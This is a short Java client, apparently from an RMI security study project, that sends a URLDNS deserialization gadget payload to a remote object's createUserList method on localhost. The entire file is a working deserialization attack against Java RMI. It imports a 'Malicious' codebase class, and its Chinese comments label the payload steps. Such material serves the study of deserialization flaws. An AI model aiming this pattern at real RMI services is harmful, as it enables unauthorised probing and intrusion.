package run.ergou.rmi;

import run.ergou.rmi.interfaces.IUserList;
import run.ergou.rmi.codebase.Malicious;
import run.ergou.rmi.util.CreateURLDNS;

import java.rmi.Naming;
import java.util.ArrayList;
import java.util.HashMap;

public class RMIClientCollection {
    public static void main(String[] args) throws Exception {

        IUserList userList = (IUserList) Naming.lookup("rmi://localhost:1099/users");

        // 创建反序列化payload对象
        HashMap hashMap = CreateURLDNS.create();

        // 集合内添加反序列化payload对象
        ArrayList list = new ArrayList();
        list.add(hashMap);

        // 调用远程对象方法
        userList.createUserList(list);

    }
}
